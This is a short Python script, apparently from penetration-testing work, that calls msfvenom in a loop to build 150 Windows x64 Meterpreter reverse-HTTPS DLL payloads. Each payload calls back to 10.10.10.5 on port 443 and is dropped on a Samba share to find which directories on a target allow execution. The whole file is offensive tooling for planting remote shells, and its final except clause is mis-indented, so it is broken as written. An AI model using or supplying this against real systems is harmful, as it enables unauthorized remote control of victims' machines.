#!/usr/bin/python
import os

# use this to build 150 meterpreter payloads with a unique UUID each.
# This is useful for brute forcing execution on a host to find out
# which directories you can get execution from.

payload = "windows/x64/meterpreter/reverse_https"
lport = "443"
lhost = "10.10.10.5"
outType = "dll"

for i in range(1,151):
	command = "msfvenom -p " + payload\
	+ " LHOST=" + lhost \
	+ " LPORT=" + lport \
	+ " PayloadUUIDTracking=true " \
	+ "  PayloadUUIDName=MeterpreterShell_" + str(i) \
	+ " -f " + outType \
	+ " > /srv/samba/share/meterpreter_uuid_" + str(i) + "." + outType
	print "[+] building payload " + str(i) 
	print command
	try:
		os.system(command)
	except:
print "[-] unable to build: " + command